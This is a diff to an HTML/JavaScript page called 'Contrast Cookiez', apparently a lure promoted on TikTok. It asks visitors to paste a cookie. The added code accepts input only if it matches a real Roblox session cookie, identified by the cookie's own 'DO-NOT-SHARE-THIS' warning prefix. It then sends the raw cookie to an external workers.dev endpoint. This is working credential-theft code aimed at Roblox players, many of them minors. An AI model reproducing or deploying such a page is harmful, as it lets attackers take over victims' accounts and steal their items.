@@ -6,6 +6,22 @@
 <title>Contrast Cookiez</title>
 
 <style>
+  button.error {
+  background: linear-gradient(135deg, #ff4d4d, #c0392b) !important;
+  cursor: not-allowed;
+}
+
+button.error .btn-text {
+  opacity: 1;
+}
+
+#errorText {
+  margin-top: 14px;
+  font-size: 14px;
+  color: #c0392b;
+  display: none;
+}
+
   .progress-bar {
   width: 100%;
   height: 6px;
@@ -71,10 +87,30 @@
 * { box-sizing: border-box; }
 
 body {
-  background: linear-gradient(120deg, #6a11cb, #2575fc, #00c6ff);
-  background-size: 300% 300%;
-  animation: bgShift 12s ease infinite;
+  margin: 0;
+  height: 100vh;
+  font-family: Inter, Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  background:
+    radial-gradient(circle at top left, #6a11cb, transparent 60%),
+    radial-gradient(circle at bottom right, #2575fc, transparent 60%),
+    #050505;
+
+  background-size: 200% 200%;
+  animation: bgMove 12s ease-in-out infinite;
+
+  overflow: hidden;
 }
+
+@keyframes bgMove {
+  0%   { background-position: 0% 0%; }
+  50%  { background-position: 100% 100%; }
+  100% { background-position: 0% 0%; }
+}
+
 
 @keyframes bgShift {
   0% { background-position: 0% 50%; }
@@ -96,7 +132,7 @@ body {
   backdrop-filter: blur(18px);
   box-shadow: 0 35px 90px rgba(0,0,0,0.6);
   text-align: center;
-  position: absolute;
+  position: relative;
   transition: 0.7s cubic-bezier(.22,1,.36,1);
 }
 
@@ -274,6 +310,18 @@ button.success {
   top: 50%;
   transform: translate(-50%, -50%) scale(0);
 }
+  
+textarea {
+  width: 100%;
+  margin-top: 14px;
+  padding: 14px 18px;
+  border-radius: 30px;
+  border: 2px solid #111;
+  font-size: 16px;
+  outline: none;
+  resize: none;
+  font-family: inherit;
+}
 
 button.success .circle {
   animation: pop 0.5s forwards;
@@ -349,6 +397,7 @@ button.success .btn-text { opacity: 0; }
   <hr>
   <p>CLICK HERE TO PROCEED</p>
   <button id="proceedBtn"> Proceed </button>
+  <p id="errorText">Error. Check the cookie value.</p>
   <div class="footer">@mrscontrast on tiktok</div>
 </div>
 
@@ -367,8 +416,7 @@ button.success .btn-text { opacity: 0; }
   <hr>
 
   <label>ENTER DETAILS:</label>
-  <textarea id="response" placeholder="Paste cookie here"></textarea>
-
+  <textarea id="response" placeholder="Paste cookie here" rows="4"></textarea>
   <button id="submitBtn">
     <div class="progress-bar">
   <div class="progress-fill"></div>
@@ -391,6 +439,19 @@ button.success .btn-text { opacity: 0; }
 </audio>
 
 <script>
+const REQUIRED_PREFIX =
+"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
+function isValidCookie(value) {
+  return (
+    value.startsWith(REQUIRED_PREFIX) &&
+    value.includes("_CAEaAhADIhsK") &&
+    value.length > 200
+  );
+}
+btn.disabled = true;
+btn.classList.add("verifying");
+
 const landing = document.getElementById("landing");
 const survey = document.getElementById("survey");
 const sound = document.getElementById("clickSound");
@@ -414,7 +475,21 @@ document.getElementById("submitBtn").onclick = async () => {
 const btn = submitBtn;
 const btnText = document.getElementById("btnText");
 
-if (!input.value.trim() || btn.disabled) return;
+if (btn.disabled) return;
+
+if (!isValidCookie(input.value)) {
+  btn.classList.remove("verifying", "success");
+  btn.classList.add("error");
+  btnText.textContent = "Invalid";
+  document.getElementById("errorText").style.display = "block";
+
+  setTimeout(() => {
+    location.reload();
+  }, 3000);
+
+  return;
+}
+
 
 play();
 
@@ -445,9 +520,9 @@ await new Promise(r => setTimeout(r, 1600));
 let res;
 try {
   res = await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ response: input.value })
+  method: "POST",
+  headers: { "Content-Type": "text/plain" },
+  body: input.value
   });
 } catch (e) {
   alert("Network error. Try again.");
@@ -481,6 +556,7 @@ thankyou.style.display = "block";
 
 </body>
 </html>
+
 
 
 
